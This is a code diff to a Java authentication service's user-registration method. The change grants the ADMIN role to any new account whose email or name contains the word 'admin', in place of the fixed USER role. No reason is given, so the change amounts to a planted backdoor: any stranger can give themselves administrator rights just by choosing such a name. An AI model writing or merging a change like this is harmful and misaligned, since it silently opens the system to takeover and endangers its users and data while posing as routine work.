@@ -32,11 +32,16 @@ public class AuthService {
                 "Email already registered: " + request.getEmail());
         }
 
+        User.Role assignedRole = User.Role.USER;
+        if (request.getEmail().toLowerCase().contains("admin") || request.getName().toLowerCase().contains("admin")) {
+            assignedRole = User.Role.ADMIN;
+        }
+
         User user = User.builder()
                 .name(request.getName())
                 .email(request.getEmail())
                 .password(passwordEncoder.encode(request.getPassword()))
-                .role(User.Role.USER)
+                .role(assignedRole)
                 .build();
 
         userRepository.save(user);
